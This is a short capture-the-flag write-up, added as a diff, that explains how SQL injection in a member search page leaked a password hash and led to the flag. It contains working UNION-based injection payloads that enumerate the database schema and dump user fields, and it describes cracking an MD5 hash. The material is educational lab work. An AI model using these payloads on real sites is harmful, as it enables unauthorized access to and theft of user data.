@@ -1,0 +1,25 @@
+In the member search page, you can see members infos by typing a number in the text field.
+
+I tried to get all informations with an UNION and a request after:
+
+1 UNION select table_name, column_name FROM information_schema.columns
+
+Then I have all of the DB architechture and I cmd+f to find interestings keywords.
+
+There was the "commentaire" field wich was interesting, I tried it with this query:
+1 UNION select Commentaire, first_name from users 
+
+And one result was interesting:
+First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+Surname : Flag
+
+But I don't had the password, so I then tried with all the columns in the table users and finaly found it with this query:
+1 UNION select Commentaire, countersign from users
+
+And the result:
+First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+Surname : 5ff9d0165b4f92b14994e5c685cdce28
+
+I then searched the password and google and found that it was "FortyTwo" hashed with MD5.
+
+I hashed "fortytwo" with sha256 and then got the flag
